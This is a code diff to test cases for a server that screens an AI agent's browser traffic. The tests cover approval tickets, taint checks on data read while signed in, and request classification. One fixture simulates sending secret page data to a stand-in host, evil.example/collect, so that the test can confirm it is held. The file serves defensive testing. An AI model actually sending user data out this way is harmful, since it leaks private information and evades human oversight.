@@ -232,9 +232,11 @@ describe("server security rules", () => {
     // The personal tab may not even open sites below read_as_you.
     assert.equal(nav.verdict, "deny");
     assert.equal(nav.rule, "profile_mismatch");
-    const post = tab.simulate({ method: "POST", url: "https://evil.example/collect", resourceType: "XHR", postData: "x=secret+stuff+read" });
-    assert.equal(post.verdict, "hold");
-    assert.equal(post.rule, "taint_exit");
+    // A page's own request passes unless it carries what was read while signed in, or what the agent typed (ADR 0027).
+    const own = tab.simulate({ method: "POST", url: "https://evil.example/collect", resourceType: "XHR", postData: "x=1&y=2" });
+    assert.deepEqual([own.verdict, own.rule], ["allow", "page_background"]);
+    const leak = tab.simulate({ method: "POST", url: "https://evil.example/collect", resourceType: "XHR", postData: "x=secret+stuff+read+while+signed+in" });
+    assert.deepEqual([leak.verdict, leak.rule], ["hold", "taint_exit"]);
   });
 
   test("activity records data shapes, not values; agents see only their own rows", async () => {
@@ -297,11 +299,13 @@ describe("server security rules", () => {
     const c = await t.mcpClient(t.token("alice", "act", "claude"));
     await c.call("open", { url: "https://forum.example/t/1" });
     const tab = [...pool.tabs].reverse()[0]!;
-    // The page by itself: a ticket in Requests, no push.
-    tab.simulate({ method: "POST", url: "https://forum.example/api/track", resourceType: "XHR", postData: "a=1" });
+    // The page by itself: passes as it would with the person in front of it (ADR 0027); no ticket, no push.
+    assert.equal(tab.simulate({ method: "POST", url: "https://forum.example/api/track", resourceType: "XHR", postData: "a=1" }).rule, "page_background");
+    // A page-made request that does need a person (here a payment nobody clicked for) is held, without a push.
+    tab.simulate({ method: "POST", url: "https://forum.example/checkout/confirm", resourceType: "XHR", postData: "a=1" });
     await sleep(30);
-    assert.ok(t.services.tickets.listOpen("alice").some((x) => (x.facts as { path?: string }).path === "/api/track"));
-    assert.equal(t.sent.length, 0, "a page-made write pushed a notification");
+    assert.ok(t.services.tickets.listOpen("alice").some((x) => (x.facts as { path?: string }).path === "/checkout/confirm"));
+    assert.equal(t.sent.length, 0, "a page-made request pushed a notification");
     // The agent's click: one clear push.
     await c.call("type", { ref: "e6", text: "hello there" });
     await c.call("click", { ref: "e7" });
@@ -624,13 +628,14 @@ describe("live Reddit findings (11 Nov 2026)", () => {
     assert.equal(tab.simulate({ method: "POST", url: "https://www.google.com/recaptcha/enterprise/reload?k=x", resourceType: "XHR" }).rule, "captcha_widget");
     const ping = tab.simulate({ method: "POST", url: "https://pi.reddit.com/v4/p", resourceType: "Ping" });
     assert.deepEqual([ping.verdict, ping.rule], ["allow", "telemetry"]);
+    // The page's own background traffic passes, as with a person in front of it (ADR 0027).
     const gql = tab.simulate({ method: "POST", url: "https://www.reddit.com/svc/shreddit/graphql", resourceType: "Fetch", postData: '{"id":"abc"}' });
-    assert.deepEqual([gql.verdict, gql.rule], ["deny", "tab_blocked"]);
+    assert.deepEqual([gql.verdict, gql.rule], ["allow", "page_background"]);
     assert.equal(t.services.tickets.listOpen("alice").length, before, "background traffic created tickets");
     assert.equal(((await c.call("list_flags")).data as unknown as unknown[]).length, 0, "quiet refusals flagged domains");
-    // Leaving the wall: the tab speaks again (writes ask as usual).
-    await c.call("open", { url: "https://www.reddit.com/r/x/" });
-    assert.equal(tab.simulate({ method: "POST", url: "https://www.reddit.com/svc/shreddit/graphql", resourceType: "Fetch", postData: '{"id":"abc"}' }).verdict, "hold");
+    // Something no page does by itself still waits behind the wall, quietly.
+    const del = tab.simulate({ method: "POST", url: "https://www.reddit.com/api/delete", resourceType: "Fetch", postData: "id=t3_x" });
+    assert.deepEqual([del.verdict, del.rule], ["deny", "tab_blocked"]);
   });
 });
 
@@ -643,11 +648,11 @@ describe("approval cards say who triggered the request", () => {
     const c = await t.mcpClient(t.token("alice", "act"));
     await c.call("open", { url: "https://forum.example/t/1" });
     const tab = [...pool.tabs].reverse()[0]!;
-    // The page, by itself, long after any agent action.
+    // The page, by itself, long after any agent action, doing something no page does without a click.
     const blob = JSON.stringify({ lst: ["rec", 10, { "1": { str: "message" }, "2": { str: "consume" }, pad: "x".repeat(500) }] });
-    tab.simulate({ method: "POST", url: "https://forum.example/api/track", resourceType: "XHR", postData: blob });
+    tab.simulate({ method: "POST", url: "https://forum.example/checkout/track", resourceType: "XHR", postData: blob });
     await sleep(30);
-    const pageTicket = t.services.tickets.listOpen("alice").find((x) => (x.facts as { path?: string }).path === "/api/track")!;
+    const pageTicket = t.services.tickets.listOpen("alice").find((x) => (x.facts as { path?: string }).path === "/checkout/track")!;
     const pv = await t.api("GET", `/api/tickets/${pageTicket.id}`, { user: "alice" });
     assert.deepEqual((pv.json.facts as { trigger: unknown }).trigger, { kind: "page" });
     assert.deepEqual(pv.json.scopes, ["once"]);
@@ -672,6 +677,8 @@ describe("approval cards say who triggered the request", () => {
     const events = '{"lst":["rec",10,{"1":{"str":"message"},"2":{"str":"consume"}}]}';
     assert.equal(tab.simulate({ method: "POST", url: "https://www.reddit.com/api/comment", resourceType: "XHR", postData: events }).rule, "telemetry");
     assert.equal(tab.simulate({ method: "POST", url: "https://www.reddit.com/api/submit", resourceType: "XHR", postData: events }).rule, "telemetry");
+    // A real comment, after the agent typed it: asks.
+    await c.call("type", { ref: "e1", text: "Thanks!" });
     const real = tab.simulate({ method: "POST", url: "https://old.reddit.com/api/comment", resourceType: "XHR", postData: "thing_id=t3_abc&text=Thanks!&uh=x" });
     assert.deepEqual([real.verdict, real.rule], ["hold", "comment"]);
   });
@@ -736,5 +743,33 @@ describe("sensitive categories are account permissions (ADR 0014)", () => {
     assert.deepEqual(list.map((x) => x.id), ["banking", "mail", "passwords", "cloud", "signin", "government"]);
     const init = (await (await fetch(`${t.base}/mcp`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${t.token("alice")}` }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "0" } } }) })).json()) as { result: { instructions: string } };
     assert.match(init.result.instructions, /call ask_person instead of asking in chat/);
+  });
+});
+
+describe("classifying requests (live finding, 12 Nov 2026)", () => {
+  test("a tracker carrying the page URL in its query isn't a purchase; the path and checkout hosts decide", async () => {
+    const { classify } = await import("../src/agent.ts");
+    assert.equal(classify("POST", "https://rum.made-in-china.com/tybrs/action?ref=https%3A%2F%2Fpurchase.made-in-china.com%2Frfq%2Flist", ""), "write");
+    assert.equal(classify("POST", "https://shop.example/checkout/confirm", ""), "pay");
+    assert.equal(classify("POST", "https://checkout.stripe.com/c/x", ""), "pay");
+    assert.equal(classify("POST", "https://purchase.made-in-china.com/rfq/save", ""), "save");
+  });
+
+  test("a page's own request that runs out of time leaves Requests", async () => {
+    const t = await startTestApp();
+    after(() => t.close());
+    const pool = t.pool as FakePool;
+    pool.pages.set("https://forum.example/t/1", { content: "x" });
+    const c = await t.mcpClient(t.token("alice", "act"));
+    await c.call("open", { url: "https://forum.example/t/1" });
+    const tab = [...pool.tabs].reverse()[0]!;
+    const h = tab.simulate({ method: "POST", url: "https://forum.example/checkout/confirm", resourceType: "XHR", postData: "a=1" });
+    assert.equal(h.verdict, "hold");
+    await sleep(20);
+    const tk = t.services.tickets.listOpen("alice").find((x) => (x.facts as { path?: string }).path === "/checkout/confirm")!;
+    assert.ok(tk);
+    await h.timeout?.();
+    await sleep(20);
+    assert.equal(t.services.tickets.get(tk.id)!.state, "expired");
   });
 });
